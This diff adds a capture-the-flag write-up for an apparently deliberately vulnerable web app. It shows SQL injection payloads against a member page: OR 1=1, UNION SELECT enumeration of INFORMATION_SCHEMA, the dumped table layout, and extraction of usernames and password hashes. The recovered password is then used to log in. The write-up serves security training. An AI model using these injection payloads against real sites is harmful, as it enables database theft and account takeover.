@@ -1,0 +1,61 @@
+How to get the flag :
+
+Go to IP/index.php?page=member
+
+999 OR 1 = 1
+
+https://dev.mysql.com/doc/refman/8.0/en/union.html
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
+
+999 UNION SELECT NULL, NULL
+
+999 UNION SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS
+999 UNION SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS
+
+Member_Brute_Force :
+  db_default :
+    id,
+    username,
+    password
+
+Member_Sql_Injection :
+  users :
+    first_name,
+    last_name,
+    town,
+    country,
+    planet,
+    Commentaire,
+    countersign
+
+Member_guestbook :
+  guestbook :
+    id_comment,
+    comment,
+    name
+
+Member_images :
+  list_images :
+    id,
+    url,
+    title,
+    comment
+
+Member_survey :
+  vote_dbs :
+    id_vote,
+    vote,
+    nb_vote,
+    subject
+
+999 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+Put the password in the decoder of https://www.dcode.fr/hash-function
+
+Go to IP/index.php?page=signin
+Login with 'shadow' as password
+
+
+How to solve password cracking :
+
+Use a better hashing function (e.g. bcrypt, ...)
